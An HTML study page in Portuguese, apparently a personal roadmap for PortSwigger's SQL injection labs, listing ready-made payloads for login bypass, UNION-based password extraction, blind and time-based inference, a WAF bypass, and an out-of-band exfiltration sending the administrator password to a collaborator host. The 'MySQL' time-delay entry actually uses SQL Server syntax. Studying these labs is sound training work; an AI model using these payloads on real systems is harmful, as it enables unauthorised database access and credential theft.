@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>SQLi Roadmap — PortSwigger</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header>
+  <div class="header-tag">PortSwigger Web Security Academy</div>
+  <h1>SQL Injection <span>Roadmap</span></h1>
+  <p>// guia prático — do básico ao avançado</p>
+  <div class="badges">
+    <span class="badge badge-a">● Apprentice</span>
+    <span class="badge badge-p">● Practitioner</span>
+    <span class="badge badge-e">● Expert</span>
+  </div>
+</header>
+
+<div class="progress-wrap">
+  <span class="progress-label">progresso</span>
+  <div class="progress-bar"><div class="progress-fill" id="pfill"></div></div>
+  <span class="progress-count" id="pcount">0 / 18</span>
+</div>
+
+<div class="container">
+
+  <!-- ───── CHEATSHEET ───── -->
+  <div class="cheat">
+    <div class="cheat-title">// payloads essenciais</div>
+    <div class="cheat-grid">
+      <div class="cheat-item">
+        <div class="cheat-label">Bypass de login</div>
+        <div class="cheat-code">admin'--</div>
+      </div>
+      <div class="cheat-item">
+        <div class="cheat-label">Testar injeção</div>
+        <div class="cheat-code">' OR '1'='1</div>
+      </div>
+      <div class="cheat-item">
+        <div class="cheat-label">UNION - descobrir colunas</div>
+        <div class="cheat-code">'+UNION+SELECT+NULL--</div>
+      </div>
+      <div class="cheat-item">
+        <div class="cheat-label">UNION - extrair dados</div>
+        <div class="cheat-code">'+UNION+SELECT+username,password+FROM+users--</div>
+      </div>
+      <div class="cheat-item">
+        <div class="cheat-label">Blind - condicional</div>
+        <div class="cheat-code">' AND 1=1-- / ' AND 1=2--</div>
+      </div>
+      <div class="cheat-item">
+        <div class="cheat-label">Time-based (MySQL)</div>
+        <div class="cheat-code">'; IF(1=1) WAITFOR DELAY '0:0:5'--</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ───── DICAS ───── -->
+  <div class="tip">
+    <span class="tip-icon">🔧</span>
+    <span>Use o <strong>Burp Suite</strong> para interceptar e modificar requisições. A maioria dos labs exige interceptar o parâmetro de categoria ou cookie.</span>
+  </div>
+  <div class="tip">
+    <span class="tip-icon">📋</span>
+    <span>Clique nas cards para marcar como concluído e revelar o payload de referência.</span>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- ───── FASE 1 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 01</span>
+      <span class="section-title">Fundamentos — Recuperando dados ocultos</span>
+    </div>
+    <p class="section-desc">// primeiros passos: entender como a injeção funciona na prática</p>
+    <div class="labs" id="s1">
+
+      <div class="lab" data-id="1" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-a">APPRENTICE</span>
+            <span class="lab-name">SQLi na cláusula WHERE — dados ocultos</span>
+          </div>
+          <div class="lab-hint">Injetar na categoria de produto para exibir itens não publicados</div>
+          <div class="lab-payload">'+OR+1=1--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="2" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-a">APPRENTICE</span>
+            <span class="lab-name">SQLi — bypass de login</span>
+          </div>
+          <div class="lab-hint">Fazer login como administrator sem saber a senha</div>
+          <div class="lab-payload">administrator'--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ───── FASE 2 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 02</span>
+      <span class="section-title">UNION Attacks — Extraindo dados de outras tabelas</span>
+    </div>
+    <p class="section-desc">// aprender a usar UNION SELECT para ler dados arbitrários do banco</p>
+    <div class="labs" id="s2">
+
+      <div class="lab" data-id="3" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">UNION — determinar número de colunas</span>
+          </div>
+          <div class="lab-hint">Descobrir quantas colunas são retornadas pela query original</div>
+          <div class="lab-payload">'+UNION+SELECT+NULL,NULL,NULL--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="4" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">UNION — encontrar coluna com texto</span>
+          </div>
+          <div class="lab-hint">Identificar qual coluna aceita dados do tipo string</div>
+          <div class="lab-payload">'+UNION+SELECT+'abc',NULL,NULL--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="5" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">UNION — extrair dados de outra tabela</span>
+          </div>
+          <div class="lab-hint">Obter usuários e senhas da tabela users</div>
+          <div class="lab-payload">'+UNION+SELECT+username,password+FROM+users--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="6" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">UNION — múltiplos valores em uma coluna</span>
+          </div>
+          <div class="lab-hint">Concatenar usuário e senha em campo único (Oracle)</div>
+          <div class="lab-payload">'+UNION+SELECT+username||'~'||password+FROM+users--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ───── FASE 3 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 03</span>
+      <span class="section-title">Examinando o banco de dados</span>
+    </div>
+    <p class="section-desc">// identificar o tipo e versão do banco para adaptar os ataques</p>
+    <div class="labs" id="s3">
+
+      <div class="lab" data-id="7" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Consultar tipo e versão — Oracle</span>
+          </div>
+          <div class="lab-hint">SELECT banner FROM v$version em Oracle</div>
+          <div class="lab-payload">'+UNION+SELECT+BANNER,NULL+FROM+v$version--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="8" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Consultar tipo e versão — MySQL/Microsoft</span>
+          </div>
+          <div class="lab-hint">Usar @@version em MySQL e SQL Server</div>
+          <div class="lab-payload">'+UNION+SELECT+@@version,NULL#</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="9" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Listar conteúdo do banco — não-Oracle</span>
+          </div>
+          <div class="lab-hint">Usar information_schema para listar tabelas e colunas</div>
+          <div class="lab-payload">'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="10" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Listar conteúdo do banco — Oracle</span>
+          </div>
+          <div class="lab-hint">Usar all_tables e all_columns em banco Oracle</div>
+          <div class="lab-payload">'+UNION+SELECT+table_name,NULL+FROM+all_tables--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ───── FASE 4 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 04</span>
+      <span class="section-title">Blind SQLi — Sem resposta visível</span>
+    </div>
+    <p class="section-desc">// explorar quando a aplicação não exibe resultado da query</p>
+    <div class="labs" id="s4">
+
+      <div class="lab" data-id="11" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — condicional booleana</span>
+          </div>
+          <div class="lab-hint">Inferir dados por diferença de comportamento (cookie)</div>
+          <div class="lab-payload">' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="12" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — erros condicionais</span>
+          </div>
+          <div class="lab-hint">Provocar erros SQL para inferir dados (Oracle)</div>
+          <div class="lab-payload">' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="13" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — visível via mensagem de erro</span>
+          </div>
+          <div class="lab-hint">Extrair dados usando mensagens de erro detalhadas</div>
+          <div class="lab-payload">' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="14" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — time delay</span>
+          </div>
+          <div class="lab-hint">Usar atraso de tempo como canal de resposta</div>
+          <div class="lab-payload">'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="15" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — time delay + extração de dados</span>
+          </div>
+          <div class="lab-hint">Combinar delay condicional para extrair senha char a char</div>
+          <div class="lab-payload">'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+      <div class="connector"></div>
+
+      <div class="lab" data-id="16" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">Blind — out-of-band (DNS lookup)</span>
+          </div>
+          <div class="lab-hint">Exfiltrar dados via requisição DNS usando Burp Collaborator</div>
+          <div class="lab-payload">'+UNION+SELECT+EXTRACTVALUE(xmltype(...),'/l/...')+FROM+dual--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ───── FASE 5 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 05</span>
+      <span class="section-title">SQLi em diferentes contextos</span>
+    </div>
+    <p class="section-desc">// encontrar injeção fora do lugar óbvio</p>
+    <div class="labs" id="s5">
+
+      <div class="lab" data-id="17" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-p">PRACTITIONER</span>
+            <span class="lab-name">SQLi em filtro de categoria — XML encoding</span>
+          </div>
+          <div class="lab-hint">Bypass de WAF usando entidades XML para ofuscar payload</div>
+          <div class="lab-payload">&#x55;NION &#x53;ELECT username||'~'||password FROM users</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ───── FASE 6 ───── -->
+  <div class="section">
+    <div class="section-header">
+      <span class="section-num">FASE 06</span>
+      <span class="section-title">Expert — SQLi de segunda ordem</span>
+    </div>
+    <p class="section-desc">// injeção armazenada que é executada depois, em outro contexto</p>
+    <div class="labs" id="s6">
+
+      <div class="lab" data-id="18" onclick="toggle(this)">
+        <div class="lab-check">✓</div>
+        <div class="lab-body">
+          <div class="lab-top">
+            <span class="lab-level lv-e">EXPERT</span>
+            <span class="lab-name">Blind SQLi — out-of-band com exfiltração</span>
+          </div>
+          <div class="lab-hint">Usar Burp Collaborator + DNS para extrair dados do banco</div>
+          <div class="lab-payload">'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.collaborator.net/"&gt; %remote;]&gt;'),'/l')FROM+dual--</div>
+        </div>
+        <a class="lab-link" href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration" target="_blank" onclick="event.stopPropagation()">→ abrir lab</a>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- /container -->
+
+<script src="js/script.js"></script>
+</body>
+</html>
